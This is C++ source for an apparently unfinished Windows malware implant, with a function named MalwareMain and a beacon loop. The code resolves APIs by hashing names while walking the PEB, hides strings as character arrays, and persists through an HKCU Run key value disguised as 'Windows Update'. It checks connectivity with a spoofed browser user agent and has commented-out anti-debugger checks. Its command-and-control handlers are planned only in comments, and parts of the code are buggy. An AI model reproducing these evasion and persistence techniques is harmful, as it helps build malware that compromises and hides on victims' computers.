#include<windows.h>
#include<winhttp.h>
#include<winternl.h>
#include<psapi.h>

#ifndef TO_LOWERCASE
#define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)
#endif

// For searching Win32API
// PEB -> PPEB_LDR_DATA -> LDR_DATA_TABLE_ENTRY.BaseDllName
typedef struct _LDR_DATA_TABLE_ENTRY_1 {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InitializationOrderLinks;
	void* DllBasee;
	void* EntryPoint;
	ULONG SIzeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	HANDLE SectionHandle;
	ULONG CheckSum;
	ULONG TimeDataStamp;
} LDR_DATA_TABLE_ENTRY_1;

struct beacon_data {
	DWORD pid;
	CHAR computer_name[MAX_COMPUTERNAME_LENGTH + 1];
	CHAR* path;

};

struct t_api_table {
	decltype(&RegOpenKeyExA) _RegOpenKeyExA;
	decltype(&RegSetValueExA) _RegSetValueExA;
	decltype(&RegCloseKey) _RegCloseKey;
	decltype(&WinHttpOpen) _WinHttpOpen;
	decltype(&WinHttpCrackUrl) _WinHttpCrackUrl;
	decltype(&WinHttpCloseHandle) _WinHttpCloseHandle;
	decltype(&WinHttpConnect) _WinHttpConnect;
	decltype(&WinHttpOpenRequest) _WinHttpOpenRequest;
	decltype(&WinHttpSendRequest) _WinHttpSendRequest;
	decltype(&WinHttpReceiveResponse)_WinHttpReceiveResponse;
	decltype(&WinHttpQueryHeaders) _WinHttpQueryHeaders;
	decltype(&WinHttpQueryDataAvailable) _WinHttpQueryDataAvailable;
	decltype(&WinHttpReadData) _WinHttpReadData;
	decltype(&MessageBoxA) _MessageBoxA;
	decltype(&LoadLibraryA) _LoadLibraryA;
	decltype(&GetProcAddress) _GetProcAddress;
	decltype(&HeapAlloc) _HeapAlloc;
	decltype(&HeapFree) _HeapFree;
	decltype(&IsDebuggerPresent) _IsDebuggerPresent;
	decltype(&CreatePipe) _CreatePipe;
	decltype(&SetHandleInformation) _SetHandleInformation;
	decltype(&GetStdHandle) _GetStdHandle;
	decltype(&CreateProcessA) _CreateProcessA;
	decltype(&GetCurrentProcessId) _GetCurrentProcessId;
	decltype(&GetComputerNameExA) _GetComputerNameExA;
	decltype(&GetModuleFileNameA) _GetModuleFileNameA;
	decltype(&GetModuleBaseNameA) _GetModuleBaseNameA;
	decltype(&OpenProcess) _OpenProcess;
	decltype(&CloseHandle) _CloseHandle;
	decltype(&CreateThread) _CreateThread;
	decltype(&Sleep) _Sleep;
	decltype(&ExitProcess) _ExitProcess;
	decltype(&GetLastError) _GetLastError;
	decltype(&GetProcessHeap) _GetProcessHeap;
	decltype(&wcslen) _wcslen;
};
/*
WCHAR enocde_base64() {
	;
}

size_t decode_base64( WCHAR* str ){
	size_t i;
	size_t counter=0;
	WCHAR decoded_data[255] = {};
	for (i = 0; i < str[i]!=0 ; i++) {
		// for A-Z
		if( 65<=str[i] && str[i]<=90 ) {
			str[i] = str[i] - 65;
		}
		// for a-z
		else if ( 97<=str[i] && str[i]<=122) {
			;
		}
		// for 0-9
		else if ( 48<=str[i] && str[i]<=57) {
			;
		}
		// for / or +
		else if (43 == str[i] && 47 == str[i] ) {
			;
		}
		else {
			;
		}
		counter++;
	}
}

WCHAR encrypt_str(WCHAR* str) {
	;
}

WCHAR decrypt_str(WCHAR* str) {
	// base64 decode
	// xor and concat
	// to wxhar
	;
}
*/

/* Calc Adler-32 */
size_t Adler_32(LPCSTR str) {
	size_t A = 1, B = 0;
	size_t i;
	for (i = 0; str[i] != 0; i++) {
		A += str[i];
		B += A;
	}
	A %= 65521;
	B %= 65521;

	return A + B * 65536;
}

size_t Adler_32_W( WCHAR* str ) {
	size_t A=1,B=0;
	size_t i;
	for (i = 0; str[i] != 0; i++) {
		A += str[i];
		B += A;
	}
	A %= 65521;
	B %= 65521;

	return A + B * 65536;
}

LPVOID ret_dl_base( size_t dllname ) {
	PEB* peb;
#if defined(__WIN64)
	peb = (PPEB)__readgsqword(0x60);
#else
	peb = (PPEB)__readfsdword(0x30);
#endif
	PEB_LDR_DATA* peb_ldr_data = peb->Ldr;
	LIST_ENTRY* head = &peb_ldr_data->InMemoryOrderModuleList;

	for (LIST_ENTRY* current = head->Flink; current != head; current= current->Flink ) {
		LDR_DATA_TABLE_ENTRY_1* entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_1, InMemoryOrderLinks);
		WCHAR* current_dllname = (entry->BaseDllName.Buffer);

		if (!current_dllname) {
			continue;
		}
		size_t i;
		// Search all dll name
		for ( i = 0; i < entry->BaseDllName.Length; i++) {
			WCHAR c1;
			// Convert upper char to lower char
			if (56 <= current_dllname[i] && current_dllname[i] <= 90) {
				TO_LOWERCASE(c1, current_dllname[i]);
				current_dllname[i] = c1;
			}
			// Verify Adler-32
		}
		if (dllname == Adler_32_W(current_dllname)) {
			return entry->DllBasee;
		}
	}
	return nullptr;
}

LPVOID ret_api_base(LPVOID dllbase , size_t apiname ) {
	IMAGE_DOS_HEADER* image_dos_header = (IMAGE_DOS_HEADER*)dllbase;
	IMAGE_NT_HEADERS* image_nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)dllbase + image_dos_header->e_lfanew);
	IMAGE_DATA_DIRECTORY* exports_dir = &(image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	DWORD export_addr = exports_dir->VirtualAddress;
	IMAGE_EXPORT_DIRECTORY* image_export_dir = (IMAGE_EXPORT_DIRECTORY*)(export_addr + (ULONG_PTR)dllbase);
	size_t name_count = image_export_dir->NumberOfNames;
	DWORD function_list_rva = image_export_dir->AddressOfFunctions;
	DWORD function_names_list_rva = image_export_dir->AddressOfNames;
	DWORD names_ord_list_rva = image_export_dir->AddressOfNameOrdinals;

	for (size_t i = 0; i < name_count; i++) {
		DWORD* name_rva = (DWORD*)(function_names_list_rva + (BYTE*)dllbase + i * sizeof(DWORD));
		WORD* name_index = (WORD*)(names_ord_list_rva + (BYTE*)dllbase + i * sizeof(WORD));
		DWORD* function_rva = (DWORD*)(function_list_rva + (BYTE*)dllbase + (*name_index) * sizeof(DWORD));
		LPCSTR curr_name = (LPCSTR)(*name_rva + (BYTE*)dllbase);
		if (apiname == Adler_32(curr_name)) {
			return (BYTE*)dllbase + (*function_rva);
		}
	}
	return nullptr;
}

void InitApiTable(t_api_table* api_table) {
	// And evade debuffer
	//		dll	kernel32.dll
	//		api IsDebuggerPresent
	// For all function
	//	dll	kernel32.dll
	//	api	HeapAlloc, HeapFree
	CHAR dll_advapi[] = { 'a','d','v','a','p','i','3','2','.','d','l','l',0 };
	CHAR dll_winhttp[] = { 'w','i','n','h','t','t','p','.','d','l','l',0};
	CHAR dll_u32[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
	CHAR dll_ucrtbased[] = {'u','c','r','t','b','a','s','e','d','.','d','l','l',0};
	const size_t dll_k32 = 489227345;

	const size_t api_regopenkeyexa = 573506776;
	const size_t api_regsetvalueexa = 668075334;
	const size_t api_regclosekey = 415171646;
	const size_t api_winhttpopen = 433587297;
	const size_t api_winhttpcrackurl = 783680998;
	const size_t api_winhttpclosehandle = 1120798481;
	const size_t api_winhttpconnect = 691471769;
	const size_t api_winhttpopenrequest = 1135413066;
	const size_t api_winhttpsendrequest = 1131153218;
	const size_t api_winhttpreceiveresponse = 1682049249;
	const size_t api_winhttpqueryheaders = 1265371041;
	const size_t api_winhttpquerydataavailable = 2153253344;
	const size_t api_winhttpreaddata = 777586117;
	const size_t api_messageboxa = 427754544;
	const size_t api_loadlibrarya = 494994583;
	const size_t api_getprocaddress = 667354491;
	const size_t api_heapalloc = 276431722;
	const size_t api_heapfree = 220070657;
	const size_t api_isdebuggerpresent = 985794243;
	const size_t api_createpipe = 350880739;
	const size_t api_sethandleinformation = 1368786943;
	const size_t api_getstdhandle = 490472600;
	const size_t api_createprocessa = 683214197;
	const size_t api_getcurrentprocessid = 1258555280;
	const size_t api_getcomputernameexa = 1117128431;
	const size_t api_getmodulefilenamea = 1093404361;
	const size_t api_getmodulebasenamea = 1090062020;
	const size_t api_openprocess = 434635890;
	const size_t api_closehandle = 421266499;
	const size_t api_createthread = 502334637;
	const size_t api_sleep = 96272890;
	const size_t api_exitprocess = 438174842;
	const size_t api_getlasterror = 496436415;
	const size_t api_getprocessheap = 681117054;
	const size_t api_wcslen = 151454349;

	LPVOID k32dll_base = ret_dl_base(dll_k32);
	api_table->_Sleep = reinterpret_cast<decltype(&Sleep)>(ret_api_base((HMODULE)k32dll_base, api_sleep));
	api_table->_GetProcAddress = reinterpret_cast<decltype(&GetProcAddress)>(ret_api_base((HMODULE)k32dll_base, api_getprocaddress));
	api_table->_LoadLibraryA = reinterpret_cast<decltype(&LoadLibraryA)>(ret_api_base((HMODULE)k32dll_base, api_loadlibrarya));
	api_table->_HeapAlloc = reinterpret_cast<decltype(&HeapAlloc)>(ret_api_base((HMODULE)k32dll_base, api_heapalloc));
	api_table->_HeapFree = reinterpret_cast<decltype(&HeapFree)>(ret_api_base((HMODULE)k32dll_base, api_heapfree));
	api_table->_IsDebuggerPresent = reinterpret_cast<decltype(&IsDebuggerPresent)>(ret_api_base((HMODULE)k32dll_base, api_isdebuggerpresent));
	api_table->_CreatePipe = reinterpret_cast<decltype(&CreatePipe)>(ret_api_base((HMODULE)k32dll_base, api_createpipe));
	api_table->_SetHandleInformation = reinterpret_cast<decltype(&SetHandleInformation)>(ret_api_base((HMODULE)k32dll_base, api_sethandleinformation));
	api_table->_GetStdHandle = reinterpret_cast<decltype(&GetStdHandle)>(ret_api_base((HMODULE)k32dll_base, api_getstdhandle));
	api_table->_CreateProcessA = reinterpret_cast<decltype(&CreateProcessA)>(ret_api_base((HMODULE)k32dll_base, api_createprocessa));
	api_table->_GetCurrentProcessId = reinterpret_cast<decltype(&GetCurrentProcessId)>(ret_api_base((HMODULE)k32dll_base, api_getcurrentprocessid));
	api_table->_GetComputerNameExA = reinterpret_cast<decltype(&GetComputerNameExA)>(ret_api_base((HMODULE)k32dll_base, api_getcomputernameexa));
	api_table->_GetModuleFileNameA = reinterpret_cast<decltype(&GetModuleFileNameA)>(ret_api_base((HMODULE)k32dll_base, api_getmodulefilenamea));
	api_table->_GetModuleBaseNameA = reinterpret_cast<decltype(&GetModuleBaseNameA)>(ret_api_base((HMODULE)k32dll_base, api_getmodulebasenamea));
	api_table->_OpenProcess = reinterpret_cast<decltype(&OpenProcess)>(ret_api_base((HMODULE)k32dll_base, api_openprocess));
	api_table->_CreateThread = reinterpret_cast<decltype(&CreateThread)>(ret_api_base((HMODULE)k32dll_base, api_createthread));
	api_table->_CloseHandle = reinterpret_cast<decltype(&CloseHandle)>(ret_api_base((HMODULE)k32dll_base, api_closehandle));
	api_table->_ExitProcess = reinterpret_cast<decltype(&ExitProcess)>(ret_api_base((HMODULE)k32dll_base, api_exitprocess));
	api_table->_GetLastError = reinterpret_cast<decltype(&GetLastError)>(ret_api_base((HMODULE)k32dll_base, api_getlasterror));
	api_table->_GetProcessHeap = reinterpret_cast<decltype(&GetProcessHeap)>(ret_api_base((HMODULE)k32dll_base, api_getprocessheap));
	LPVOID advapidll_base = api_table->_LoadLibraryA(dll_advapi);
	api_table->_RegOpenKeyExA = reinterpret_cast<decltype(&RegOpenKeyExA)>(ret_api_base((HANDLE)advapidll_base, api_regopenkeyexa));
	api_table->_RegSetValueExA = reinterpret_cast<decltype(&RegSetValueExA)>(ret_api_base((HANDLE)advapidll_base, api_regsetvalueexa));
	api_table->_RegCloseKey = reinterpret_cast<decltype(&RegCloseKey)>(ret_api_base((HANDLE)advapidll_base, api_regclosekey));
	LPVOID winhttpdll_base = api_table->_LoadLibraryA(dll_winhttp);
	api_table->_WinHttpOpen = reinterpret_cast<decltype(&WinHttpOpen)>(ret_api_base((HMODULE)winhttpdll_base, api_winhttpopen));
	api_table->_WinHttpCrackUrl = reinterpret_cast<decltype(&WinHttpCrackUrl)>(ret_api_base((HMODULE)winhttpdll_base, api_winhttpcrackurl));
	api_table->_WinHttpCloseHandle = reinterpret_cast<decltype(&WinHttpCloseHandle)>(ret_api_base((HMODULE)winhttpdll_base, api_winhttpclosehandle));
	api_table->_WinHttpConnect = reinterpret_cast<decltype(&WinHttpConnect)>(ret_api_base((HMODULE)winhttpdll_base, api_winhttpconnect));
	api_table->_WinHttpOpenRequest = reinterpret_cast<decltype(&WinHttpOpenRequest)>(ret_api_base((HMODULE)winhttpdll_base, api_winhttpopenrequest));
	api_table->_WinHttpSendRequest =reinterpret_cast<decltype(&WinHttpSendRequest)>(ret_api_base((HMODULE)winhttpdll_base, api_winhttpsendrequest));
	api_table->_WinHttpReceiveResponse = reinterpret_cast<decltype(&WinHttpReceiveResponse)>(ret_api_base((HMODULE)winhttpdll_base, api_winhttpreceiveresponse));
	api_table->_WinHttpQueryHeaders = reinterpret_cast<decltype(&WinHttpQueryHeaders)>(ret_api_base((HMODULE)winhttpdll_base, api_winhttpqueryheaders));
	api_table->_WinHttpQueryDataAvailable = reinterpret_cast<decltype(&WinHttpQueryDataAvailable)>(ret_api_base((HMODULE)winhttpdll_base, api_winhttpquerydataavailable));
	api_table->_WinHttpReadData = reinterpret_cast<decltype(&WinHttpReadData)>(ret_api_base((HMODULE)winhttpdll_base, api_winhttpreaddata));
	LPVOID u32dll_base = api_table->_LoadLibraryA(dll_u32);
	api_table->_MessageBoxA = reinterpret_cast<decltype(&MessageBoxA)>(ret_api_base((HMODULE)u32dll_base, api_messageboxa));
	LPVOID ucrtbaseddll_base = api_table->_LoadLibraryA(dll_ucrtbased);
	api_table->_wcslen = reinterpret_cast<decltype(&wcslen)>(ret_api_base((HMODULE)ucrtbaseddll_base, api_wcslen));
}

void InitBeaconData(t_api_table* api, beacon_data* beacon) {
	beacon->pid = api->_GetCurrentProcessId();

	HANDLE hProcess = api->_OpenProcess( PROCESS_ALL_ACCESS, FALSE, beacon->pid );
	if (hProcess == NULL) {
		api->_ExitProcess(0);
	}

	DWORD nSize = 0;
	if (!api->_GetModuleFileNameA(NULL, beacon->path, nSize)) {
		api->_GetModuleFileNameA(NULL, beacon->path, nSize);
	}

	DWORD lnSize = sizeof(beacon->computer_name) / sizeof( CHAR );
	api->_GetComputerNameExA((COMPUTER_NAME_FORMAT)0, beacon->computer_name, &lnSize);

	api->_CloseHandle(hProcess);
}
// command upload

// command download

// command sleep

// command execution
//	dll	kernel32.dll
//	api CreatePipe, SetHandleInformation, GetStdHandle, CreateProcessA

// Beacon communication
void MalwareMain(t_api_table* api_table) {
	CHAR aa[] = {'a',0};
	CHAR ss[] = {'s',0};
	api_table->_MessageBoxA(NULL,aa,ss,0x2L);
	// Send veacon
	//		dll winhttp.dll
	//		api WinHttpOpen, WinHttpCrackUrl, WinHttpCloseHandle, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpReceiveResponse, WinHttpQueryHeaders, WinHttpQueryDataAvailable, WinHttpReadData, 
	//
	// Get Command
	//		dll winhttp.dll
	//		api WinHttpOpen, WinHttpCrackUrl, WinHttpCloseHandle, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpReceiveResponse, WinHttpQueryHeaders, WinHttpQueryDataAvailable, WinHttpReadData, 
	// 
	// Gen command threat
	//		dll kernel32.dll
	//		api CreateThreat
	//
	// sleep
	//		dll kernel32.dll
	//		api Sleep
	;
}

bool IsPersistence( t_api_table* api, beacon_data* beacon ) {
	HKEY hKey = NULL;
	CHAR reg_value[] = { 'W','i','n','d','o','w','s',' ','U','p','d','a','t','e',0};
	CHAR regsubkey[] = { 'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n',0};
	if (api->_RegOpenKeyExA(HKEY_CURRENT_USER, regsubkey, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
		api->_RegCloseKey(hKey);
		return FALSE;
	}
	api->_RegSetValueExA(hKey,reg_value,0,REG_SZ,(LPBYTE)beacon->path,sizeof(beacon->path));
	api->_RegCloseKey(hKey);
	return TRUE;
}

// When response is 200, return TRUE
bool IsInternetAvailable( t_api_table* api ) {
	WCHAR url[] = {'h','t','t','p','s',':','/','/','w','w','w','.','m','i','c','r','o','s','o','f','t','.','c','o','m',0};
	WCHAR uagent[] = { 'M','o','z','i','l','l','a',' ','/',' ','5','.','0',' ','(','W','i','n','d','o','w','s',' ','N','T',' ','1','0','.','0',';',' ','W','i','n','6','4',';',' ','x','6','4',')',' ','A','p','p','l','e','W','e','b','K','i','t',' ','/',' ','5','3','7','.','3','6',' ','(','K','H','T','M','L',',',' ','l','i','k','e',' ','G','e','c','k','o',')',' ','C','h','r','o','m','e',' ','/',' ','7','9','.','0','.','3','9','4','5','.','8','8',' ','S','a','f','a','r','i',' ','/',' ','5','3','7','.','3','6',0};
	WCHAR get[] = {'G','E','T',0};
	URL_COMPONENTS urlComponents;
	HINTERNET hSession, hConnect, hRequest;
	WCHAR szHostName[256], szUrlPath[2048];
	LPVOID header;
	DWORD ret = 0;
	DWORD dwSize;
	DWORD dwStatusCode;
	DWORD error;

	SecureZeroMemory( &urlComponents, sizeof(urlComponents) );
	// Validate url
	hSession = api->_WinHttpOpen(uagent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (hSession == NULL ){//|| api->_IsDebuggerPresent()) {
		return FALSE;
	}
	urlComponents.dwStructSize = sizeof(URL_COMPONENTS);
	urlComponents.lpszHostName = szHostName;
	urlComponents.dwHostNameLength = sizeof(szHostName) / sizeof(WCHAR);
	urlComponents.lpszUrlPath = szUrlPath;
	urlComponents.dwUrlPathLength = sizeof(szUrlPath) / sizeof(WCHAR);
	if (!api->_WinHttpCrackUrl(url, api->_wcslen(url), 0, &urlComponents)) {
		api->_WinHttpCloseHandle(hSession);
		return FALSE;
	}
	hConnect = api->_WinHttpConnect(hSession, szHostName, urlComponents.nPort, 0);
	if (hConnect == NULL) {
		api->_WinHttpCloseHandle(hSession);
		return FALSE;
	}
	// Start http
	hRequest = api->_WinHttpOpenRequest(hConnect, get, szUrlPath,
		NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	if (hRequest == NULL) {
		error = api->_GetLastError();
		api->_WinHttpCloseHandle(hConnect);
		api->_WinHttpCloseHandle(hSession);
		return FALSE;
	}
	if (api->_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
		WINHTTP_NO_REQUEST_DATA, 0,
		WINHTTP_IGNORE_REQUEST_TOTAL_LENGTH, 0) == FALSE) {
		api->_WinHttpCloseHandle(hRequest);
		api->_WinHttpCloseHandle(hConnect);
		api->_WinHttpCloseHandle(hSession);
		return FALSE;
	}
	if (api->_WinHttpReceiveResponse(hRequest, NULL) == FALSE) {
		api->_WinHttpCloseHandle(hRequest);
		api->_WinHttpCloseHandle(hConnect);
		api->_WinHttpCloseHandle(hSession);
		return FALSE;
	}
	// Get response header
	dwSize = 0;
	if (api->_WinHttpQueryHeaders(hRequest,
		WINHTTP_QUERY_RAW_HEADERS_CRLF,
		WINHTTP_HEADER_NAME_BY_INDEX,
		WINHTTP_NO_OUTPUT_BUFFER, &dwSize,
		WINHTTP_NO_HEADER_INDEX) == FALSE) {
		if (api->_GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
			api->_WinHttpCloseHandle(hRequest);
			api->_WinHttpCloseHandle(hConnect);
			api->_WinHttpCloseHandle(hSession);
			return FALSE;
		}
	}
	HANDLE proh = api->_GetProcessHeap();
	header = api->_HeapAlloc(proh, HEAP_ZERO_MEMORY, dwSize);
	if (header == NULL ){//} || api->_IsDebuggerPresent() ) {
		api->_WinHttpCloseHandle(hRequest);
		api->_WinHttpCloseHandle(hConnect);
		api->_WinHttpCloseHandle(hSession);
		return FALSE;
	}
	if (api->_WinHttpQueryHeaders(hRequest,
		WINHTTP_QUERY_RAW_HEADERS_CRLF,
		WINHTTP_HEADER_NAME_BY_INDEX,
		header, &dwSize, WINHTTP_NO_HEADER_INDEX) == FALSE) {
		api->_HeapFree(api->_GetProcessHeap(), 0, header);
		api->_WinHttpCloseHandle(hRequest);
		api->_WinHttpCloseHandle(hConnect);
		api->_WinHttpCloseHandle(hSession);
		return FALSE;
	}
	api->_HeapFree(api->_GetProcessHeap(), 0, header);
	// Verify response code
	dwSize = sizeof(DWORD);
	api->_WinHttpQueryHeaders(hRequest,
		WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize,
		WINHTTP_NO_HEADER_INDEX);
	if (dwStatusCode != HTTP_STATUS_OK) {
		api->_WinHttpCloseHandle(hRequest);
		api->_WinHttpCloseHandle(hConnect);
		api->_WinHttpCloseHandle(hSession);
		return TRUE;
	}
	return FALSE;
}

int main() {
	// Generate API table
	t_api_table _api_table;
	beacon_data _beacon_data;
	InitApiTable(&_api_table);
	InitBeaconData(&_api_table, &_beacon_data);
	// Check internet connection
	bool is_internet = IsInternetAvailable( &_api_table );
	if (!is_internet) {
		_api_table._ExitProcess(0);
	}
	// Persist in registry
	bool is_persistence = IsPersistence( &_api_table , &_beacon_data);
	if (!is_persistence) {
		_api_table._ExitProcess(0);
	}
	// Beacon communication
	while (true) {
		MalwareMain( &_api_table );
		_api_table._Sleep(900000);
	}
}